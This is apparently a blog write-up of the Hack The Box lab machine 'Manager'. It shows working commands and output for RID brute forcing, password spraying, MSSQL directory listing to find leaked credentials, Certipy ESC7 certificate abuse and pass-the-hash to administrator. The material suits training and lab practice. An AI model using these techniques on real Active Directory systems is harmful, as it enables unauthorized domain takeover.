---
layout: post
title: "HTB: Manager"
author: Andrew Cherney
date: 2024-03-16 11:57:05
tags: htb medium-box windows webapp smb mssql lfi esc7 certipy
icon: "assets/icons/manager.png"
post_description: "Through an rid brute usernames can be found which can then be used for a login brute force as operator. MSSQL contains an LFI vulnerability to find a backup and associated credentials located on the webapp. Certipy is then used to exploit an ESC7 cert to request and approve a certificate to login as administrator."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $nmap -sC 10.10.11.236
Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-26 14:17 CDT
Nmap scan report for 10.10.11.236
Host is up (0.21s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
|_http-title: Manager
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
|_ssl-date: 2023-10-27T02:18:05+00:00; +7h00m11s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
|_ssl-date: 2023-10-27T02:18:03+00:00; +7h00m12s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
1433/tcp open  ms-sql-s
|_ssl-date: 2023-10-27T02:18:13+00:00; +7h00m11s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: MANAGER
|   NetBIOS_Domain_Name: MANAGER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: manager.htb
|   DNS_Computer_Name: dc01.manager.htb
|   DNS_Tree_Name: manager.htb
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-10-27T02:03:30
|_Not valid after:  2053-10-27T02:03:30
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-10-27T02:18:03+00:00; +7h00m12s from scanner time.

Host script results:
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m11s, deviation: 0s, median: 7h00m10s
| smb2-time: 
|   date: 2023-10-27T02:18:03
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 97.99 seconds
```

{% include img_link src="/img/manager/manager_front_page" alt="front_page" ext="png" trunc=600 %}

To start off we have a host of windows services including SMB and MSSQL as well as an http server, which is bare bones at first glance. 

I try kerbrute and then crackmapexec for rid brute forcing users and get a solid list of canidates.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $crackmapexec smb manager.htb -u anonymous -p '' --rid-brute
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\anonymous: 
SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

After some perusing around SMB and scanning the http site I decide to check for common passwords against any of these users. First stop is usernames as passwords so I run crackmapexec with the list of users as both username and password. 


```
Zhong
Cheng
Ryan
Raven
JinWoo
ChinHae
Operator
```

```
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $cat users | tr [:upper:] [:lower:] > users
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $cat users
zhong
cheng
ryan
raven
jinwoo
chinhae
operator
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $crackmapexec smb manager.htb -u users -p users
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\operator:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
```

operator:operator is our initial foothold here. Admittedly it doesn't give us access to ssh, but the MSSQL service allows us to login with guest permissions.

# User as raven

## MSSQL Local File Read

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $impacket.mssqlclient manager.htb/operator:operator@manager.htb -dc-ip dc01.manager.htb -windows-auth
Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> 
```

A few avenues are available to us, but here we don't have reconfigure permissions so a many of the code execution tricks won't work. I did enumerate sys.servers and find a connected server. 

```bash
SQL (MANAGER\Operator  guest@tempdb)> SELECT * FROM sys.servers;
server_id   name              product      provider   data_source       location   provider_string   catalog   connect_timeout   query_timeout   is_linked   is_remote_login_enabled   is_rpc_out_enabled   is_data_access_enabled   is_collation_compatible   uses_remote_collation   collation_name   lazy_schema_validation   is_system   is_publisher   is_subscriber   is_distributor   is_nonsql_subscriber   is_remote_proc_transaction_promotion_enabled   modify_date   is_rda_server   
---------   ---------------   ----------   --------   ---------------   --------   ---------------   -------   ---------------   -------------   ---------   -----------------------   ------------------   ----------------------   -----------------------   ---------------------   --------------   ----------------------   ---------   ------------   -------------   --------------   --------------------   --------------------------------------------   -----------   -------------   
        0   DC01\SQLEXPRESS   SQL Server   SQLNCLI    DC01\SQLEXPRESS   NULL       NULL              NULL                    0               0           0                         1                    1                        0                         0                       1   NULL                                  0           0              0               0                0                      0                                              0   2023-07-27 04:21:13               0   
```

Some time passed and after researching and digging nothing of note was found. There was however [https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack) which lays out a local file reading capability present withing mssql as any user. This particular exploit reads an NTLM hash location for relay and pass-the-hash attacks. In this case I can repurpose this to check out some common windows web content directories. 

```
SQL (MANAGER\Operator  guest@tempdb)> exec master.dbo.xp_dirtree 'c:\inetpub\wwwroot\' ,1,1;
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1   

```

There is another mention here that the `,1,1;` at the end specifies to go 1 level deep and 1 (True) for isFile. Without the isFile option set to 1 it will only show directories. But here I find an old backup zip, go grab that from the web server and inspect the contents: 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $ls -al website-backup-27-07-23-old/
total 68
drwxr-xr-x 5 raccoon raccoon  4096 Dec 17 17:39 .
drwxr-xr-x 5 raccoon raccoon  4096 Dec 17 17:39 ..
-rw-r--r-- 1 raccoon raccoon  5386 Jul 27 06:32 about.html
-rw-r--r-- 1 raccoon raccoon  5317 Jul 27 06:32 contact.html
drwx------ 2 raccoon raccoon  4096 Dec 17 17:39 css
drwx------ 2 raccoon raccoon  4096 Dec 17 17:39 images
-rw-r--r-- 1 raccoon raccoon 18203 Jul 27 06:32 index.html
drwx------ 2 raccoon raccoon  4096 Dec 17 17:39 js
-rw-r--r-- 1 raccoon raccoon   698 Jul 27 06:35 .old-conf.xml
-rw-r--r-- 1 raccoon raccoon  7900 Jul 27 06:32 service.html
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $cat website-backup-27-07-23-old/.old-conf.xml 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

Easy username and password, ssh in for user flag.


```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $evil-winrm --ip manager.htb --user raven@manager.htb --password R4v3nBe5tD3veloP3r\!123

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Raven\Documents> dir
*Evil-WinRM* PS C:\Users\Raven\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Raven\Desktop> dir


    Directory: C:\Users\Raven\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/17/2023   8:03 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Raven\Desktop> type user.txt
ea4ae30d8bcf--------------------
```

# Root

## ESC7

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $certipy find -vulnerable -u raven@manager.htb -p R4v3nBe5tD3veloP3r\!123 -target-ip dc01.manager.htb
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Saved BloodHound data to '20231217185825_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231217185825_Certipy.txt'
[*] Saved JSON output to '20231217185825_Certipy.json'
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $cat 20231217185825_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```

ESC7 is a vulnerability classified by two permissions set for a user: `ManageCA` and `ManageCertificates` (CA administrator and Certificate Manager). With these permissions set it is possible to request a certificate and then immediately approve and use a certificate which you can define the permissions of. 

[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7) attack #2 will be our vector. 

Step 1: Add current user to officer
Step 2: enable SubCA template
Step 3: request certificate with upn as administrator@manager.htb
Step 4: issue the failed certificate request
Step 5: retrieve the certificate and use it to login as administrator

It is important to note here the certificate request will initially fail, and that is expected.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $certipy req -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123 -ca manager-DC01-CA -target manager.htb -template SubCA -upn 'administrator@manager.htb'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 13
Would you like to save the private key? (y/N) n
[-] Failed to request certificate
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $certipy ca  -ca 'manager-DC01-CA' -issue-request 13 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 13
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 13
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '13.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

## NTP Nightmare

This sections outlines a unique problem I needed to solve despite knowing the theoretical solution. In short the next step is to set your ntp server to the box to bypass a KRB_AP_ERR_SKEW error as seen below. Virtualbox has a service which autosets time to host time, running as a service that I didnt see documented but had to search through services to find. If you use virtualbox and find this to be a problem the service is `virtualbox-guest-utils`

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $certipy auth -pfx administrator.pfx -username administrator -domain manager.htb -dc-ip 10.10.11.236
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $sudo service virtualbox-guest-utils stop
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $sudo rdate -n manager.htb
Tue Dec 19 05:30:32 CST 2023
```

Lastly use the auth function of certipy and get the password of administrator to login with evil-winrm and obtain the root flag.


```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $certipy auth -pfx administrator.pfx -username administrator -domain manager.htb -dc-ip 10.10.11.236
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Manager]
└──╼ $evil-winrm -i manager.htb -u administrator -p aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
606a22460a0c---------------------
```


